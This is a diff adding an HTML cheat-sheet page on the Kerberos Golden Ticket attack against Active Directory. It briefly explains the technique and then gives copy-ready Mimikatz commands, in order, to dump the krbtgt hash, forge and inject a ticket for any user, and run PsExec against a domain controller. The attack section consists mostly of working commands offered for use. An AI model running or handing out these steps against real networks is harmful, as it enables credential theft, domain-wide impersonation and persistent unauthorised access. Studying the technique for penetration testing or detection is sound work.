@@ -1,0 +1,106 @@
+<section class="page active prose-page">
+  <h1>Golden Ticket</h1>
+
+  <p class="intro">
+    A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the NTLM hash of the krbtgt account.
+    Because the ticket is signed with the domain's Kerberos secret, Domain Controllers trust it as legitimate, allowing
+    an attacker to impersonate any existing domain user and assign arbitrary group memberships, including Domain Admins.
+    Golden Tickets are commonly used for persistence and unrestricted access across an Active Directory domain.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Requirements</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Access to the krbtgt NTLM hash and the domain SID.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Advantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Provides long-term domain persistence and unrestricted Kerberos authentication across the domain.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Disadvantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Requires compromise of the krbtgt account or Domain Controller and is detectable by advanced security monitoring.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Enable Debug Privilege</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">privilege::debug</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Dump krbtgt Hash</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">lsadump::lsa /patch</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Purge Existing Kerberos Tickets</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">kerberos::purge</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Create And Inject Golden Ticket</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">kerberos::golden /user:&lt;user&gt; /domain:&lt;domain name&gt; /sid:&lt;domain SID&gt; /krbtgt:&lt;krbtgt hash&gt; /ptt</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Open Command Prompt</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">misc::cmd</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Use Ticket For Remote Access</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">PsExec.exe \\dc1 cmd.exe</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
